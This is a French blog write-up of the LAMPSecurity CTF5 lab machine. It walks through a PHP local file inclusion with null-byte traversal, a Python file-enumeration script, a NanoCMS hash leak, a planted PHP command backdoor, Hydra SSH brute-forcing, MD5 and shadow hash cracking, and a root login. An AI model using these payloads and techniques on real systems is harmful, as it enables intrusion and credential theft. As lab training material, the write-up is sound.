# Solution du LAMPSecurity CTF #5

Introduction
------------

J'ai décidé de continuer et terminer la série des CTF LAMPSecurity présents sur *VulnHub*. Cela correspond aux CTF 5, 7 et 8.  

Le présent article est ma solution du [LAMPSecurity 5](http://vulnhub.com/entry/lampsecurity-ctf5,84/) qui, comme tous les CTFs de la série, a été simple à résoudre (si vous débutez dans les CTFs, cette série vous est destinée).  

Pour donner une idée le CTF 5 ne m'a pris que 2 heures pour parvenir a avoir un accès total en comptant les durées de scan, d'attaques brute-force, cassage de hashs + des pauses (bah oui on est pas à l'usine... bien que j’enchaîne en ce moment :-p ).  

Le système utilisé pour ce CTF est une *Fedora* en version 8.  

Collecte d'information
----------------------

```plain
Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-14 14:01 CEST
Nmap scan report for 192.168.1.69
Host is up (0.00035s latency).
Not shown: 990 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 4.7 (protocol 2.0)
| ssh-hostkey: 
|   1024 05:c3:aa:15:2b:57:c7:f4:2b:d3:41:1c:74:76:cd:3d (DSA)
|_  2048 43:fa:3c:08:ab:e7:8b:39:c3:d6:f3:a4:54:19:fe:a6 (RSA)
25/tcp   open  smtp        Sendmail 8.14.1/8.14.1
| smtp-commands: localhost.localdomain Hello --- snip ---
|_ 2.0.0 This is sendmail 2.0.0 Topics: 2.0.0 HELO EHLO --- snip --
80/tcp   open  http        Apache httpd 2.2.6 ((Fedora))
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Phake Organization
110/tcp  open  pop3        ipop3d 2006k.101
|_pop3-capabilities: UIDL USER LOGIN-DELAY(180) TOP STLS
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/0  rpcbind
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          32768/udp  status
|_  100024  1          57639/tcp  status
139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: MYGROUP)
143/tcp  open  imap?
|_imap-capabilities: MULTIAPPEND IMAP4REV1 SORT --- snip ---
445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: MYGROUP)
901/tcp  open  http        Samba SWAT administration server
| http-auth: 
| HTTP/1.0 401 Authorization Required
|_  Basic realm=SWAT
|_http-title: 401 Authorization Required
3306/tcp open  mysql       MySQL 5.0.45
| mysql-info: 
|   Protocol: 53
|   Version: .0.45
|   Thread ID: 3
|   Capabilities flags: 41516
|   Some Capabilities: Support41Auth, --- snip ---, LongColumnFlag
|   Status: Autocommit
|_  Salt: )9%I$s=pB4|:I??]79W+
1 service unrecognized despite returning data.
SF-Port143-TCP:V=6.46%I=7%D=7/14%Time=53C3C68E%P=x86_64-suse-linux-gnu%r(N
SF:ULL,93,"\*\x20OK\x20\[CAPABILITY\x20IMAP4REV1\x20LITERAL\+\x20SASL-IR\x
--- snip ---
SF:20STARTTLS\]\x20\[192\.168\.1\.69\]\x20IMAP4rev1\x202006k\.396\x20at\x2
SF:0Mon,\x2014\x20Jul\x202014\x2004:03:26\x20-0400\x20\(EDT\)\r\n");
MAC Address: 00:0C:29:44:6B:32 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop
Service Info: Hosts: localhost.localdomain, 192.168.1.69; OS: Unix

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.26a-6.fc8)
|   Computer name: localhost
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: localhost.localdomain
|_  System time: 2014-07-14T04:05:03-04:00
| smb-security-mode: 
|   Account that was used for smb scripts: guest
|   User-level authentication
|   SMB Security: Challenge/response passwords supported
|_  Message signing disabled (dangerous, but default)
|_smbv2-enabled: Server doesn't support SMBv2 protocol
```

Il y a différents services qui peuvent nous intéresser mais je me suis tourné directement vers le site web qui est celui de la *Phake Organization*.  

Sur ce site on trouve :  

* des urls qui prennent un paramêtre page
* un blog *NanoCMS* sous le path */~andy/*
* ce qui semble être un *Drupal* sous */events/*
* Un formulaire d'inscription à une maling-list sous */list/*
* une page avec un formulaire de contact (*?page=contact*)

Attaque
-------

La faille est d'une banalité navrante : si on demande ?page=yop on obtient des erreurs PHP bien trop bavardes.  

```plain
Warning: include_once(inc/yop.php) [function.include-once]: failed to open stream: No such file or directory in /var/www/html/index.php on line 6
```

L'inclusion est donc relative et ajoute une extension. Il est alors possible de remonter l'arborescence et de placer un null byte pour casser l'ajout de l'extension. Ainsi avec *?page=../../../../../../../../etc/passwd%00* on obtient :  

```plain
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
rpm:x:37:37:RPM user:/var/lib/rpm:/sbin/nologin
polkituser:x:87:87:PolicyKit:/:/sbin/nologin
avahi:x:499:499:avahi-daemon:/var/run/avahi-daemon:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
openvpn:x:498:497:OpenVPN:/etc/openvpn:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
torrent:x:497:496:BitTorrent Seed/Tracker:/var/spool/bittorrent:/sbin/nologin
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
gdm:x:42:42::/var/gdm:/sbin/nologin
patrick:x:500:500:Patrick Fair:/home/patrick:/bin/bash
jennifer:x:501:501:Jennifer Sea:/home/jennifer:/bin/bash
andy:x:502:502:Andrew Carp:/home/andy:/bin/bash
loren:x:503:503:Loren Felt:/home/loren:/bin/bash
amy:x:504:504:Amy Pendelton:/home/amy:/bin/bash
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
```

Le système compte 5 utilisateurs : *patrick, jennifer, andy, loren* et *amy*. Cela pourra nous servir plus tard.  

La faille étant presque [celle du CTF4](http://devloop.users.sourceforge.net/index.php?article96/solution-du-ctf-lampsecurity-ctf4), il suffit de modifier légèrement le script Python que j'avais écrit pour effectuer une énumération rapide de fichiers sur le système :  

```python
import requests

URL = "http://192.168.1.69/index.php?page=../../../../../..PARAM%00"

fd = open("logs.txt")

while True:
    word = fd.readline()
    if not word:
        break
    word = word.strip()
    r = requests.get(URL.replace("PARAM", word))
    if not "failed to open stream" in r.content:
        print "Contenu trouve avec", word
fd.close()
```

Evidemment à vous de remplir préalablement le fichier *logs.txt* avec des paths de fichiers intéressants (les *.ssh/id\_rsa* des utilisateurs par exemple).  

J'obtiens l'output suivant :  

```plain
Contenu trouve avec /var/log/lastlog
Contenu trouve avec /var/log/wtmp
Contenu trouve avec /var/run/utmp
Contenu trouve avec /etc/passwd
Contenu trouve avec /etc/group
Contenu trouve avec /etc/hosts
Contenu trouve avec /etc/motd
Contenu trouve avec /etc/issue
Contenu trouve avec /etc/redhat-release
Contenu trouve avec /etc/crontab
Contenu trouve avec /etc/inittab
Contenu trouve avec /proc/version
Contenu trouve avec /proc/cmdline
Contenu trouve avec /etc/httpd/conf/httpd.conf
Contenu trouve avec /etc/my.cnf
Contenu trouve avec /etc/php.ini
Contenu trouve avec /var/mail/apache
Contenu trouve avec /var/log/dmesg
Contenu trouve avec /home/patrick/.bashrc
Contenu trouve avec /home/jennifer/.bashrc
Contenu trouve avec /home/andy/.bashrc
Contenu trouve avec /home/amy/.bashrc
Contenu trouve avec /home/loren/.bashrc
```

Pas grand chose d'intéressant : on parvient à accéder aux *.bashrc* mais pas aux clés SSH. Les logs *Apache* sont eux aussi inaccessibles.  

Après avoir testé différentes urls du type */~nom\_utilisateur*, il semble que seul andy exploite le module *user\_dir* d'*Apache* dont rien de plus à fouiller ici.  

Une recherche rapide sur Internet et je trouve une vulnérabilité concernant *NanoCMS* : ce système de blog sans base de données stocke les hashs des utilisateurs [dans un fichier texte accessible à tous](http://www.securityfocus.com/bid/34508).  

Ainsi à l'adresse */~andy/data/pagesdata.txt* j'obtiens (il s'agit d'un extrait) :  

```plain
s:5:"admin";s:8:"password";s:32:"9d2f75377ac0ab991d40c91fd27e52fd";
```

Une autre recherche rapide permet de retrouver ce hash sur le web qui correspond au mot de passe *shannon*.  

Une fois connecté en admin il est très aisé de créer une nouvelle page php pour y placer par exemple une backdoor.  

![NanoCMS edit a PHP webpage](https://raw.githubusercontent.com/devl00p/blog/master/images/ctf5.png)

On peut ensuite lancer des commandes simplement via */~andy/data/pages/pwned.php?cmd=ls*  

Mais cet accès ne semble pas apporter plus d'informations...  

J'ai préféré lancer une attaque brute-force sur les comptes SSH en utilisant une liste des 500 pires mots de passe.  

```plain
$ ./hydra -L users.txt -P top500.txt -e nsr ssh://192.168.1.69
Hydra v8.0 (c) 2014 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2014-07-14 14:42:12
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 2510 login tries (l:5/p:502), ~9 tries per task
[DATA] attacking service ssh on port 22
[STATUS] 187.00 tries/min, 187 tries in 00:01h, 2323 todo in 00:13h, 10 active
[STATUS] 156.00 tries/min, 468 tries in 00:03h, 2042 todo in 00:14h, 10 active
[STATUS] 157.00 tries/min, 1099 tries in 00:07h, 1411 todo in 00:09h, 10 active
[STATUS] 153.92 tries/min, 1847 tries in 00:12h, 663 todo in 00:05h, 10 active
[22][ssh] host: 192.168.1.69   login: amy   password: dolphins
[STATUS] attack finished for 192.168.1.69 (waiting for children to finish) ...
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2014-07-14 14:56:21
```

Hydra a trouvé le password *dolphins* pour l'utilisatrice *amy*.  

```plain
$ ssh amy@192.168.1.69
amy@192.168.1.69's password: 
[amy@localhost ~]$ history
    1  su patrick
    2  su jennifer
    3  su andy
    4  su loren
    5  exit
    6  history
[amy@localhost ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Mot de passe : 
Sorry, user amy may not run sudo on localhost.
```

Bon, il ne faut pas fouiller de ce côté.  

Dans le fichier de configuration du *Drupal* (*/var/www/html/events/sites/default/settings.php*) on trouve un identifiant pour la base de données :  

```php
$db_url = 'mysql://root:mysqlpassword@localhost/drupal';
```

Une fois connecté à MySQL on trouve une base contacts :  

```plain
mysql> select * from contact;
+----+--------------------+--------------------------------+--------------+--------------------+
| id | name               | email                          | phone        | org                |
+----+--------------------+--------------------------------+--------------+--------------------+
|  1 | Patrick Fair       | patrick@localhost.localdomain  | 555.123.4567 | Phake Organization |
|  2 | Mr. Important User | important@localhost            | 555.123.4567 | Secret Org         |
|  3 | Jennifer Sea       | jennifer@localhost.localdomain | 555.123.4567 | Phake Organization |
|  4 | Andy Carp          | andy@localhost.localdomain     | 555.123.4567 | Phake Organization |
|  5 | Loren Felt         | loren@localhost.localdomain    | 555.123.4567 | Phake Organization |
|  6 | Amy Pendleton      | amy@localhost.localdomain      | 555.123.4567 | Phake Organization |
+----+--------------------+--------------------------------+--------------+--------------------+
```

Ainsi que la base *Drupal* sur laquelle se cache d'autres identifiants à casser :  

```plain
mysql> select uid,name,pass from users;
+-----+----------+----------------------------------+
| uid | name     | pass                             |
+-----+----------+----------------------------------+
|   0 |          |                                  |
|   1 | jennifer | e3f4150c722e6376d87cd4d43fef0bc5 |
|   2 | patrick  | 5f4dcc3b5aa765d61d8327deb882cf99 |
|   3 | andy     | b64406d23d480b88fe71755b96998a51 |
|   4 | loren    | 6c470dd4a0901d53f7ed677828b23cfd |
|   5 | amy      | e5f0f20b92f7022779015774e90ce917 |
+-----+----------+----------------------------------+
```

Il s'agit de hashs MD5, j'en ai cassé deux via JtR :  

```plain
$ /opt/jtr/john --wordlist=mega_dict.txt --format=raw-md5 hash.txt 
Loaded 5 password hashes with no different salts (Raw MD5 [128/128 AVX intrinsics 12x])
password         (patrick)
temppass         (amy)
guesses: 2  time: 0:00:00:02 DONE (Mon Jul 14 15:17:54 2014)  c/s: 33511K
```

Et le reste via le site [hashkiller.co.uk](http://www.hashkiller.co.uk/) :  

```plain
andy:newdrupalpass
loren:lorenpass
```

Mais cela ne me donne toujours pas d'accès root.  

Escalade de privilèges
----------------------

Dans */var/spool/mail/* on trouve un email pour *amy* :

```plain
From apache@localhost.localdomain  Wed Apr 29 13:00:34 2009
Return-Path: <apache@localhost.localdomain>
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
        by localhost.localdomain (8.14.1/8.14.1) with ESMTP id n3TH0Yqh007374
        for <amy@localhost.localdomain>; Wed, 29 Apr 2009 13:00:34 -0400
Received: (from apache@localhost)
        by localhost.localdomain (8.14.1/8.14.1/Submit) id n3TH0Yv7007373;
        Wed, 29 Apr 2009 13:00:34 -0400
Date: Wed, 29 Apr 2009 13:00:34 -0400
Message-Id: <200904291700.n3TH0Yv7007373@localhost.localdomain>
To: amy@localhost.localdomain
Subject: An administrator created an account for you at Phake Organization Event Manager
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8Bit
X-Mailer: Drupal
Errors-To: patrick@localhost.localdomain
Sender: patrick@localhost.localdomain
Reply-To: patrick@localhost.localdomain
From: patrick@localhost.localdomain

amy,

A site administrator at Phake Organization Event Manager has created an account for you.
You may now log in to http://192.168.229.129/events/?q=user using the following username and password:

username: amy
password: temppass

You may also log in by clicking on this link or copying and pasting it in your browser:

http://192.168.229.129/events/?q=user/reset/5/1241024434/68f9e4a85f2fad39d3140101bcc3865a

This is a one-time login, so it can be used only once.

After logging in, you will be redirected to http://192.168.229.129/events/?q=user/5/edit so you can change your password.

--  Phake Organization Event Manager team
```

Visiblement *Patrick* est l'administrateur... Nous allons fouillez dans son répertoire personnel en détail.  

Finalement je trouve un dossier *.tomboy* qui correspond à [une application de prise de notes Gnome-powered](https://wiki.gnome.org/Apps/Tomboy).  

Or une note est particulièrement intéressante :  

```html
[amy@localhost .tomboy]$ cat 481bca0d-7206-45dd-a459-a72ea1131329.note 
<?xml version="1.0" encoding="utf-8"?>
<note version="0.2" xmlns:link="http://beatniksoftware.com/tomboy/link" xmlns:size="http://beatniksoftware.com/tomboy/size" xmlns="http://beatniksoftware.com/tomboy">
  <title>Root password</title>
  <text xml:space="preserve"><note-content version="0.1">Root password

Root password

50$cent</note-content></text>
  <last-change-date>2012-12-05T07:24:52.7364970-05:00</last-change-date>
  <create-date>2012-12-05T07:24:34.3731780-05:00</create-date>
  <cursor-position>15</cursor-position>
  <width>450</width>
  <height>360</height>
  <x>0</x>
  <y>0</y>
  <open-on-startup>False</open-on-startup>
</note>
```

F\*\*tus beatniks :D Il n'y a plus qu'à passer root via su :  

```plain
[amy@localhost ~]$ su 
Mot de passe : 
[root@localhost amy]# id
uid=0(root) gid=0(root) groupes=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=unconfined_u:system_r:unconfined_t:s0
[root@localhost amy]# head -1 /etc/shadow
root:$1$7ailm4aT$4HlsZaiGztAsgj4JXL92Y.:14362:0:99999:7:::
```

Les hashs présents dans /etc/shadow se cassent facilement avec la wordlist de *RockYou* (visiblement l'auteur du CTF aime bien cette liste et utilise les mots de passe trouvés dedans pour ses autres CTFs) :  

```plain
Loaded 5 password hashes with 5 different salts (FreeBSD MD5 [128/128 AVX intrinsics 12x])
50$cent          (cyrus)
buckyboy         (loren)
homebrew         (jennifer)
marvin1          (andy)
ne1410s          (patrick)
guesses: 5  time: 0:00:20:01 DONE (Mon Jul 14 16:13:48 2014)  c/s: 35139  trying: ne14101s - NE1469
```

Pwned!

*Published July 21 2014 at 19:11*